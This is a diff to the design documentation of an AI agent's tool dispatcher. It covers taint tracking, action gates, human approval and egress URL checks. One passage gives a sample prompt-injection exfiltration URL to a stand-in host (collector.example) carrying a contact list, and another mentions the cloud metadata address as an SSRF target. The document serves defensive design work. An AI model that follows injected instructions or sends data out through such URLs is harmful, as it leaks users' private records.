@@ -84,7 +84,7 @@ The registry refuses to start rather than guess:
 2. **Classify** the tool from the registry.
 3. **Action gate.** Refuse when the session's taint has reached the tool's gate.
 4. **Human-only check.** Refuse without an approval whose digest matches this exact input. The approval is attached by the operator path, never taken from model output.
-5. **Egress.** Every string in an egress tool's input that parses as a fetchable URL (parsed the way `fetch` parses it, so `http:/host` and `HTTP:host` count) must pass the URL validator, at any taint. At full taint, the input may not carry data out.
+5. **Egress.** Every string in an egress tool's input that parses as a fetchable URL (parsed the way `fetch` parses it, so `http:/host` and `HTTP:host` count) must pass the URL validator, at any taint. Once the session has read anything from outside (metadata taint and up), the input may not carry data out.
 6. **Pre-call checks**, such as rate limits and budgets. A check that throws refuses the call.
 7. **Run the handler.**
 8. **Raise the session's taint** to the tool's taint, plus any taint the handler reports. This happens on failure too, because an error message can carry remote text.
@@ -137,7 +137,7 @@ Content cannot close its own block, for two reasons. First, the fence is 16 rand
 
 Decimal, octal and hexadecimal spellings of an IPv4 address are normalized by the URL parser and checked as the address they name. A hostname such as `fdic.gov` is a name, not an address, and is allowed.
 
-**At full taint**, a request is itself an outbound channel, so an injected instruction might try `https://collector.example/?d=<the contact list>`. Tools with `egress: "url"` refuse a URL whose host, path, query or fragment carries any of these:
+**From metadata taint up**, a request is itself an outbound channel. The session holds records or snippets worth leaking, and text that may carry an instruction might try `https://collector.example/?d=<the contact list>`. Tools with `egress: "url"` refuse a URL whose host, path, query or fragment carries any of these:
 
 - an email address, plain or percent-encoded;
 - an encoded blob (64 or more base64 or hex characters with no separators, not even a slash);
@@ -146,7 +146,7 @@ Decimal, octal and hexadecimal spellings of an IPv4 address are normalized by th
 
 Tools with `egress: "url"` or `"query"` also refuse any input string that carries an email address or an encoded blob. Input nested too deeply, or holding too many strings to scan, is refused rather than partly scanned.
 
-**What a URL check cannot see.** A public hostname can resolve to a private address. A fetch handler requests the normalized URL that `validateUrl` returns, never the raw input, and validates every redirect hop rather than following redirects automatically. A handler never adds a scheme to a scheme-less string such as `169.254.169.254/latest`: input that is not a full URL is refused, not repaired, because the dispatcher only checks strings that already parse as URLs. Data can also hide in a short slug, so the egress checks reduce leaks rather than prevent them. The guarantee is that full taint refuses every send, write and spend.
+**What a URL check cannot see.** A public hostname can resolve to a private address. A fetch handler requests the normalized URL that `validateUrl` returns, never the raw input, and validates every redirect hop rather than following redirects automatically. A handler never adds a scheme to a scheme-less string such as `169.254.169.254/latest`: input that is not a full URL is refused, not repaired, because the dispatcher only checks strings that already parse as URLs. Data can also hide in a short slug or in plain words in a path (`/jane-doe-vp-sales`), so the egress checks reduce leaks rather than prevent them. The guarantee is that full taint refuses every send, write and spend.
 
 ## Delegation
 
